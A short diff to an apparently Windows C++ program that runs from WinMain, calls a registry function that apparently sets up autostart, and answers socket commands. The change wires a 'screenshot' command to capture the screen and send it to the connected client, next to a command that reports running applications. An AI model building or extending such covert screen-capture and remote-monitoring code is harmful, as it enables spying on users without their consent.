@@ -7,6 +7,8 @@
 #include <chrono>
 #include <thread>
 #include <nlohmann/json.hpp>
+#include <ctime>
+#include "screenshot.h"
 
 using namespace std::chrono;
 
@@ -42,7 +44,7 @@ void HandleClientData(SOCKET clientSocket, std::map<std::string, AppInfo>& appIn
         else {
             key[bytesRead] = '\0';
             if (strcmp(key, "screenshot") == 0) {
-                // Здесь может быть логика для обработки команды "screenshot"
+                CaptureScreenshot(clientSocket);
             }
             if (strcmp(key, "json") == 0) {
                 send_json(clientSocket, appInfoMap);
@@ -68,9 +70,11 @@ void addToRegistry() {
 }
 
 
-
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     addToRegistry();
+    // Регистрируем обработчик события выключения
+    //SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE);
+
     SetConsoleOutputCP(1251);
     std::map<std::string, AppInfo> appInfoMap;
 
